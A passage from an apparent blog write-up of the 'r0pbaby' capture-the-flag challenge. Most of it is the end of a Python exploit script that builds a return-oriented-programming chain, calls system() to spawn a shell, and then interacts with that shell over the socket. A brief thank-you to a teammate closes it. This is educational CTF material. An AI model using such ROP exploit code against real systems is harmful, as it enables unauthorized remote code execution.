</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x68732f2f</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MOVMEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># finally, return-to-system and invoke a shell</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">length</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] sending &quot;</span> <span class="o">+</span> <span class="n">length</span> <span class="o">+</span> <span class="s">&quot; bytes&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># interact with the shell</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Putting it all together:</p>

<p><img src="http://barrebas.github.io/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
</feed>
